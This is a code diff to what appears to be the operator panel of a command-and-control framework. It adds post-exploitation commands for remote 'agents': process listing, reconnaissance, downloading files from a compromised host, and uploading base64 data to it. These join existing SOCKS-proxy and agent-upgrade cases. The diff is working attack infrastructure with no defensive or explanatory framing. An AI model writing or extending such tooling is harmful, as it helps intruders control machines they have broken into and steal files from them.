@@ -364,6 +364,23 @@
                     var port = prompt('SOCKS proxy port:');
                     if (port) await api('POST', '/agents/' + selectedAgentId + '/socks', { port: parseInt(port) });
                     break;
+                case 'ps':
+                    await api('POST', '/agents/' + selectedAgentId + '/postex', { op: 'ps' });
+                    break;
+                case 'recon':
+                    await api('POST', '/agents/' + selectedAgentId + '/postex', { op: 'recon' });
+                    break;
+                case 'download':
+                    var dl = prompt('Remote file path:');
+                    if (dl) await api('POST', '/agents/' + selectedAgentId + '/postex', { op: 'download', path: dl });
+                    break;
+                case 'upload':
+                    var up = prompt('Remote path and base64, separated by |:');
+                    if (up && up.indexOf('|') > 0) {
+                        var parts = up.split('|');
+                        await api('POST', '/agents/' + selectedAgentId + '/postex', { op: 'upload', path: parts[0], data: parts.slice(1).join('|') });
+                    }
+                    break;
                 case 'upgrade':
                     await api('POST', '/agents/' + selectedAgentId + '/upgrade');
                     break;
